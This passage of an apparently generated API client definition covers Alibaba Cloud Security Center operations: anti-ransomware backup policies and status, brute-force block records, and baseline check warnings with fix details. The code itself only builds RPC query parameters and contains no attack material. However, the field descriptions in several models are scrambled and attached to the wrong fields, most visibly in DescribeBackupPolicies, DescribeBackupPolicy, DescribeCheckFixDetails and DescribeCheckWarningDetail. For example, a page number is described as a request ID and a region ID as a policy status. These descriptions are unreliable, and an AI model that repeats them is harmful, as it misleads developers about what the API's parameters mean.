  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.path)) {
    query['Path'] = request.path;
  }
  if (!Util.isUnset(request.snapshotHash)) {
    query['SnapshotHash'] = request.snapshotHash;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupFiles(request: DescribeBackupFilesRequest): DescribeBackupFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupFilesWithOptions(request, runtime);
}

model DescribeBackupMachineStatusRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeBackupPolicy](~~DescribeBackupPolicy~~) operation to query the UUIDs of servers.', example='eb2c782e-64f2-4590-a86c-d90164df****'),
}

model DescribeBackupMachineStatusResponseBody = {
  backupMachineStatus?: {
    clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent.', example='c-000dbefaw9f7gnbw****'),
    clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **ONLINE**: normal
*   **CLIENT_CONNECTION_ERROR**: abnormal
*   **UNINSTALLING**: being uninstalled
*   **UNINSTALL_FAILED**: failed to be uninstalled
*   **UPGRADING**: being upgraded
*   **UPGRADE_FAILED**: failed to be upgraded', example='ONLINE'),
    clientVersion?: string(name='ClientVersion', description='The version of the anti-ransomware agent.', example='2.11.0'),
    errorCode?: string(name='ErrorCode', description='The error code returned.', example='CLIENT_CONNECTION_ERROR'),
    errorList?: [ 
      {
        errorCode?: string(name='ErrorCode', description='The error code returned.', example='TARGET_NOT_EXIST'),
        errorStatus?: string(name='ErrorStatus', description='The error message returned.', example='FAILED'),
      }
    ](name='ErrorList', description='An array that consists of the error information reported by the backup server.'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-2zeaqkb80vloxjcj****'),
    regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shenzhen'),
    savedBackupCount?: int32(name='SavedBackupCount', description='The number of backup versions.', example='7'),
    status?: string(name='Status', description='The status of the anti-ransomware agent. Valid values:

*   **NOT_INSTALLED**: not installed
*   **CLIENT_CONNECTION_ERROR**: abnormal
*   **ACTIVATED**: normal', example='ACTIVATED'),
    uuid?: string(name='Uuid', description='The UUID of the server.', example='eb2c782e-64f2-4590-a86c-d90164df****'),
    vaultId?: string(name='VaultId', description='The ID of the backup vault in which the backup data is stored.', example='v-0005i2qh5fcr6seo****'),
  }(name='BackupMachineStatus', description='The backup status of the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model DescribeBackupMachineStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupMachineStatusResponseBody(name='body'),
}

async function describeBackupMachineStatusWithOptions(request: DescribeBackupMachineStatusRequest, runtime: Util.RuntimeOptions): DescribeBackupMachineStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupMachineStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupMachineStatus(request: DescribeBackupMachineStatusRequest): DescribeBackupMachineStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupMachineStatusWithOptions(request, runtime);
}

model DescribeBackupPoliciesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of entries returned per page. Default value: 10.', example='1'),
  machineRemark?: string(name='MachineRemark', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1.1.XX.XX'),
  name?: string(name='Name', description='The number of the page to return. Default value: 1.', example='SecurityStrategy-20200303'),
  pageSize?: int32(name='PageSize', description='The page number of the returned page.', example='10'),
  status?: string(name='Status', description='The pagination information.', example='enabled'),
}

model DescribeBackupPoliciesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The version of the anti-ransomware policy. Valid values:

*   1.0.0
*   2.0.0', example='3'),
    currentPage?: int32(name='CurrentPage', description='An array that consists of the anti-ransomware policies returned.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of the servers on which the anti-ransomware agent is in an abnormal state.', example='10'),
    totalCount?: int32(name='TotalCount', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='30'),
  }(name='PageInfo', description='The number of entries returned on the current page.'),
  policies?: [ 
    {
      clientErrorCount?: int32(name='ClientErrorCount', description='The upgrade status of the anti-ransomware policy. Valid values:

*   **NotUpgraded**
*   **Upgrading**
*   **UpgradeFailed**
*   **UpgradeSuccess**', example='2'),
      clientErrorUuidList?: [ string ](name='ClientErrorUuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.'),
      clientStatus?: string(name='ClientStatus', description='The UUIDs of the servers on which the anti-ransomware agent is in an **abnormal** state.', example='running'),
      healthClientCount?: int32(name='HealthClientCount', description='The UUIDs that are returned based on the value of the MachineRemark request parameter.', example='2'),
      healthClientUuidList?: [ string ](name='HealthClientUuidList', description='The total number of anti-ransomware policies returned.'),
      id?: long(name='Id', description='The UUIDs that are returned based on the value of the MachineRemark request parameter.', example='11'),
      name?: string(name='Name', description='The UUIDs of the servers on which the anti-ransomware agent is in an **abnormal** state.', example='SecurityStrategy-20200303'),
      policy?: string(name='Policy', description='The status of the anti-ransomware agent. Valid values:

*   **running**: normal
*   **exception**: abnormal', example='{"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows\\\\","Python27\\\\","Program Files (x86)\\\\","Program Files\\\\","Boot\\\\","$RECYCLE.BIN","System Volume Information\\\\","Users\\\\Administrator\\\\NTUSER.DAT*","ProgramData\\\\","pagefile.sys","Users\\\\Default\\\\NTUSER.DAT*","Users\\\\Administrator\\\\ntuser.*"],"ExcludeSystemPath":true,"Include":[],"IsDefault":1,"Retention":7,"Schedule":"I|1630689360|PT24H","Source":[],"SpeedLimiter":"","UseVss":true}'),
      policyRegionId?: string(name='PolicyRegionId', description='The ID of the anti-ransomware policy.', example='ch-hangzhou'),
      policyVersion?: string(name='PolicyVersion', description='The ID of the region that you specified for data backup when you installed the anti-ransomware agent for the server not deployed on Alibaba Cloud.', example='2.0.0'),
      remarkedUuidList?: [ string ](name='RemarkedUuidList', description='The UUIDs of the servers on which data backup is exceptional.'),
      serverType?: string(name='ServerType', description='The UUIDs of the servers on which the anti-ransomware agent is in a **normal** state.', example='OUT_CLOUD'),
      serviceErrorCount?: int32(name='ServiceErrorCount', description='The number of the servers on which the anti-ransomware agent is in a normal state.', example='2'),
      serviceErrorUuidList?: [ string ](name='ServiceErrorUuidList', description='The type of the server. Valid values:

*   **OUT_CLOUD**: server not deployed on Alibaba Cloud
*   **ALIYUN**: Elastic Compute Service (ECS) instance
*   **TRIPARTITE**: simple application server'),
      status?: string(name='Status', description='The number of servers on which data backup is exceptional.', example='enabled'),
      upgradeStatus?: string(name='UpgradeStatus', description='The name of the anti-ransomware policy.', example='Upgrading'),
      uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers on which the anti-ransomware agent is in a **normal** state.'),
    }
  ](name='Policies', description='The configurations of the anti-ransomware policy. The value of this parameter is in the JSON format and contains the following fields:

*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that are protected. If the value of this field is \\[], all formats of files are protected.

*   **Source**: the directory that is protected. If the value of this field is \\[], all directories are protected.

*   **ExcludeSystemPath**: indicates whether a specified directory is excluded from the anti-ransomware policy. If the value of this field is **true**, the directory is excluded. If this field is left empty, no directories are excluded.

*   **Exclude**: the directory that is excluded from the anti-ransomware policy. If no directory is specified, the value of this field is \\[].

*   **Schedule**: the start time and interval of a data backup task. A start time that begins during off-peak hours but does not start on the hour is recommended. Examples:

    *   If the value of this field is I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If the value of this field is I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If the value of this field is 7, backup data is retained for a week. If the value of this field is 365, backup data is retained for a year. If the value of this field is -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If the value of this field is 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: indicates whether the VSS feature is enabled. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.'),
  requestId?: string(name='RequestId', description='The total number of anti-ransomware policies returned.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeBackupPoliciesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupPoliciesResponseBody(name='body'),
}

async function describeBackupPoliciesWithOptions(request: DescribeBackupPoliciesRequest, runtime: Util.RuntimeOptions): DescribeBackupPoliciesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupPolicies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupPolicies(request: DescribeBackupPoliciesRequest): DescribeBackupPoliciesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupPoliciesWithOptions(request, runtime);
}

model DescribeBackupPolicyRequest {
  id?: long(name='Id', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='51880'),
}

model DescribeBackupPolicyResponseBody = {
  backupPolicyDetail?: {
    clientStatus?: string(name='ClientStatus', example='running'),
    id?: long(name='Id', example='51880'),
    name?: string(name='Name', example='testBuckUp'),
    policy?: string(name='Policy', description='DescribeBackupPolicy', example='{
      "Exclude": [
            "/bin/",
            "/usr/bin/",
            "/sbin/",
            "/boot/",
            "/proc/",
            "/sys/",
            "/srv/",
            "/lib/",
            "/selinux/",
            "/usr/sbin/",
            "/run/",
            "/lib32/",
            "/lib64/",
            "/lost+found/",
            "/var/lib/kubelet/",
            "/var/lib/ntp/proc",
            "/var/lib/container",
            "Windows\\\\",
            "Python27\\\\",
            "Program Files (x86)\\\\",
            "Program Files\\\\",
            "Boot\\\\",
            "$RECYCLE.BIN",
            "System Volume Information\\\\",
            "Users\\\\Administrator\\\\NTUSER.DAT*",
            "ProgramData\\\\",
            "pagefile.sys",
            "Users\\\\Default\\\\NTUSER.DAT*",
            "Users\\\\Administrator\\\\ntuser.*"
      ],
      "ExcludeSystemPath": true,
      "Include": [],
      "IsDefault": 1,
      "Retention": 7,
      "Schedule": "I|1630689360|PT24H",
      "Source": [],
      "SpeedLimiter": "",
      "UseVss": true
}'),
    policyVersion?: string(name='PolicyVersion', description='Queries the details of an anti-ransomware policy for servers.', example='2.0.0'),
    regionId?: string(name='RegionId', example='cn-beijing'),
    status?: string(name='Status', description='The ID of the anti-ransomware policy.', example='closed'),
    uuidList?: [ string ](name='UuidList'),
  }(name='BackupPolicyDetail', description='The ID of the request, which is used to locate and troubleshoot issues.'),
  requestId?: string(name='RequestId', description='The ID of the region in which backup data is stored.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupPolicyResponseBody(name='body'),
}

async function describeBackupPolicyWithOptions(request: DescribeBackupPolicyRequest, runtime: Util.RuntimeOptions): DescribeBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupPolicy(request: DescribeBackupPolicyRequest): DescribeBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupPolicyWithOptions(request, runtime);
}

model DescribeBackupRestoreCountResponseBody = {
  backupRestoreCount?: {
    recovering?: int32(name='Recovering', example='3'),
    total?: int32(name='Total', example='30'),
  }(name='BackupRestoreCount'),
  requestId?: string(name='RequestId', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
}

model DescribeBackupRestoreCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupRestoreCountResponseBody(name='body'),
}

/**
  * The number of the restoration tasks that are in the **being restored** state.
  *
  * @param request DescribeBackupRestoreCountRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeBackupRestoreCountResponse
 */
async function describeBackupRestoreCountWithOptions(runtime: Util.RuntimeOptions): DescribeBackupRestoreCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeBackupRestoreCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The number of the restoration tasks that are in the **being restored** state.
  *
  * @return DescribeBackupRestoreCountResponse
 */
async function describeBackupRestoreCount(): DescribeBackupRestoreCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupRestoreCountWithOptions(runtime);
}

model DescribeBruteForceRecordsRequest {
  blockIp?: string(name='BlockIp', example='175.106.XX.XX'),
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  status?: int32(name='Status', example='1'),
}

model DescribeBruteForceRecordsResponseBody = {
  machineList?: [ 
    {
      aliNetOnline?: boolean(name='AliNetOnline'),
      blockExpireDate?: long(name='BlockExpireDate', example='1671506882063'),
      blockIp?: string(name='BlockIp', example='10.12.XX.XX'),
      blockType?: string(name='BlockType'),
      errorCode?: string(name='ErrorCode', example='InstanceSecurityGroupLimitExceeded'),
      id?: long(name='Id', example='112XX'),
      instanceName?: string(name='InstanceName', example='record-test-***'),
      internetIp?: string(name='InternetIp', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='192.168.XX.XX'),
      port?: string(name='Port', example='22/22'),
      ruleName?: string(name='RuleName', example='AntiRuleName'),
      source?: string(name='Source', example='userRule'),
      status?: int32(name='Status', example='2'),
      uuid?: string(name='Uuid', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
    }
  ](name='MachineList'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='263'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeBruteForceRecordsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBruteForceRecordsResponseBody(name='body'),
}

async function describeBruteForceRecordsWithOptions(request: DescribeBruteForceRecordsRequest, runtime: Util.RuntimeOptions): DescribeBruteForceRecordsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBruteForceRecords',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBruteForceRecords(request: DescribeBruteForceRecordsRequest): DescribeBruteForceRecordsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBruteForceRecordsWithOptions(request, runtime);
}

model DescribeBruteForceSummaryRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='DescribeBruteForceSummary', example='203.119.XX.XX'),
}

model DescribeBruteForceSummaryResponseBody = {
  bruteForceSummary?: {
    allStrategyCount?: int32(name='AllStrategyCount', example='13'),
    antiBruteForceRuleCount?: string(name='AntiBruteForceRuleCount'),
    customEffectiveCount?: string(name='CustomEffectiveCount'),
    customRecordCount?: string(name='CustomRecordCount'),
    effectiveCount?: int32(name='EffectiveCount', example='2'),
    systemEffectiveCount?: string(name='SystemEffectiveCount'),
    systemRecordCount?: string(name='SystemRecordCount'),
  }(name='BruteForceSummary'),
  requestId?: string(name='RequestId', example='AE60EAE3-ABD0-897C-B0F16CAC6C7D'),
}

model DescribeBruteForceSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBruteForceSummaryResponseBody(name='body'),
}

async function describeBruteForceSummaryWithOptions(request: DescribeBruteForceSummaryRequest, runtime: Util.RuntimeOptions): DescribeBruteForceSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBruteForceSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBruteForceSummary(request: DescribeBruteForceSummaryRequest): DescribeBruteForceSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBruteForceSummaryWithOptions(request, runtime);
}

model DescribeCheckEcsWarningsRequest {
  sourceIp?: string(name='SourceIp', example='1.2.3.4'),
}

model DescribeCheckEcsWarningsResponseBody = {
  canTry?: string(name='CanTry', example='0'),
  requestId?: string(name='RequestId', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  sasVersion?: string(name='SasVersion', example='3'),
  weakPasswordCount?: string(name='WeakPasswordCount', example='3'),
}

model DescribeCheckEcsWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckEcsWarningsResponseBody(name='body'),
}

async function describeCheckEcsWarningsWithOptions(request: DescribeCheckEcsWarningsRequest, runtime: Util.RuntimeOptions): DescribeCheckEcsWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckEcsWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckEcsWarnings(request: DescribeCheckEcsWarningsRequest): DescribeCheckEcsWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckEcsWarningsWithOptions(request, runtime);
}

model DescribeCheckFixDetailsRequest {
  checkIds?: string(name='CheckIds', description='Indicates whether the rule is optional. Valid values:

*   **1**: yes
*   **0**: no', example='58'),
  lang?: string(name='Lang', description='The description of the rule.', example='zh'),
  riskId?: long(name='RiskId', description='The default value of the rule.', example='51'),
}

model DescribeCheckFixDetailsResponseBody = {
  checkFixDetails?: [ 
    {
      checkDesc?: string(name='CheckDesc', description='The description of the risk item.', example='Force users not to reuse recently used passwords to reduce the risk of password guessing attacks'),
      checkId?: long(name='CheckId', description='The minimum value of the rule parameter.', example='58'),
      checkItem?: string(name='CheckItem', description='The information about the parameter.', example='Ensure password reuse is limited'),
      rules?: [ 
        {
          checkId?: long(name='CheckId', description='The information about the rule parameter.', example='58'),
          defaultValue?: int32(name='DefaultValue', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='1'),
          optional?: int32(name='Optional', description='The rule that is supported by the risk item.', example='1'),
          paramList?: [ 
            {
              enumValue?: string(name='EnumValue', example='0,1,2,3'),
              maxValue?: int32(name='MaxValue', example='24'),
              minValue?: int32(name='MinValue', example='5'),
              paramDefaultValue?: string(name='ParamDefaultValue', description='The number of risk items that can be fixed.', example='5'),
              paramDesc?: string(name='ParamDesc', description='The ID of the risk item.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
              paramName?: string(name='ParamName', description='The ID of the request, which is used to locate and troubleshoot issues.', example='range_val'),
              paramType?: int32(name='ParamType', description='Queries the parameters that you can configure to fix specified risk items.', example='1'),
              ruleId?: string(name='RuleId', example='pwd_reuse.system_auth'),
              value?: string(name='Value', example='18'),
            }
          ](name='ParamList', description='An array that consists of the rule parameters.'),
          ruleDesc?: string(name='RuleDesc', description='The ID of the risk item.

>  You can call the [DescribeCheckWarningSummary](~~116179~~) operation to query the IDs of risk items.', example='(/etc/system-auth)Force users not to reuse the number of recently used passwords between 5 and 24'),
          ruleId?: string(name='RuleId', description='The data returned.', example='pwd_reuse.system_auth'),
          value?: int32(name='Value', description='The ID of the rule.', example='5'),
          varName?: string(name='VarName', description='The specified value of the rule parameter.', example='open'),
        }
      ](name='Rules', description='The options that can be selected for the rule parameter if the value of the ParamType parameter is 2.'),
    }
  ](name='CheckFixDetails', description='The specified value of the rule parameter.'),
  count?: int32(name='Count', example='20'),
  requestId?: string(name='RequestId', example='0DBF1E27-98D8-5EC2-9CF3-4A2E26F6****'),
}

model DescribeCheckFixDetailsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckFixDetailsResponseBody(name='body'),
}

async function describeCheckFixDetailsWithOptions(request: DescribeCheckFixDetailsRequest, runtime: Util.RuntimeOptions): DescribeCheckFixDetailsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckFixDetails',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckFixDetails(request: DescribeCheckFixDetailsRequest): DescribeCheckFixDetailsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckFixDetailsWithOptions(request, runtime);
}

model DescribeCheckWarningDetailRequest {
  checkWarningId?: long(name='CheckWarningId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='98675301'),
  lang?: string(name='Lang', description='The ID of the check item.', example='zh'),
  sourceIp?: string(name='SourceIp', description='The additional information about the risk item.', example='103.25.XX.XX'),
}

model DescribeCheckWarningDetailResponseBody = {
  advice?: string(name='Advice', description='Queries the details about a specified check item.', example='You can fix it in the following ways:↵1. To configure authentication for redis service, click the redis.conf Configure complex password in requirepass, and then restart redis.↵2. In redis configuration file redis.conf The configuration is as follows: bind 127.0.0.1, only allow local access, and then restart redis'),
  checkId?: long(name='CheckId', example='946'),
  description?: string(name='Description', example='The redis port is open to the outside world and there is no authentication option configured. In addition to directly obtaining all the information in the database, unauthorized users can also attack the system through unauthorized access vulnerability.'),
  item?: string(name='Item', example='Redis unauthorized access'),
  level?: string(name='Level', example='high'),
  prompt?: string(name='Prompt', example='weak passwords (username@host/password):root@****/12***'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  type?: string(name='Type', description='DescribeCheckWarningDetail', example='Security audit'),
}

model DescribeCheckWarningDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningDetailResponseBody(name='body'),
}

async function describeCheckWarningDetailWithOptions(request: DescribeCheckWarningDetailRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkWarningId)) {
    query['CheckWarningId'] = request.checkWarningId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarningDetail(request: DescribeCheckWarningDetailRequest): DescribeCheckWarningDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningDetailWithOptions(request, runtime);
}

model DescribeCheckWarningMachinesRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of check items.', example='58'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  riskId?: long(name='RiskId', description='The ID of the baseline.

> You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of baselines.', example='43'),
  status?: int32(name='Status', description='Specifies whether the check item passed the baseline check. Valid values:
*   **1**: no
*   **3**: yes', example='1'),
}

model DescribeCheckWarningMachinesResponseBody = {
  count?: int32(name='Count', description='The number of the servers on which the same risk item is detected.', example='10'),
  machines?: [ 
    {
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp1dp42hgn1xcq8l****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='win-oracl****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
    }
